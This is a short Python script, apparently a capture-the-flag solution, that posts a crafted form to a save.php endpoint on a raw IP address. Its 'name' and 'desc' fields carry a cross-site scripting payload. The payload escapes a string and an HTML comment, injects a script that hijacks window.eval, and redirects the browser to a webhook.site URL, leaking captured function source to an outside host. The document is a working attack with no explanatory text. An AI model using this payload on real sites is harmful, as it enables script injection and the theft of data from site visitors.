import requests

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ko,en-US;q=0.9,en;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5,fr;q=0.4',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://52.231.141.177:27221',
    'Referer': 'http://52.231.141.177:27221/',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

data = {
    'color': 'blue',
    'name': '");<!--<script\n`',
    'desc': '`;const originalEval = eval; function fake_eval(code){if (code.includes("flag")) { console.log("flag?", code); } location.href = "https://webhook.site/edf110af-9641-4cb3-8891-63ead5e5c8fc?".concat(escape(fake_eval.caller));  return true; }; window.eval = fake_eval;//</script>--><a id="onasd" href="zxc"></a>',
}

response = requests.post('http://52.231.141.177:27221/save.php', headers=headers, data=data, verify=False)
print(response)
print(response.headers)
print(response.text)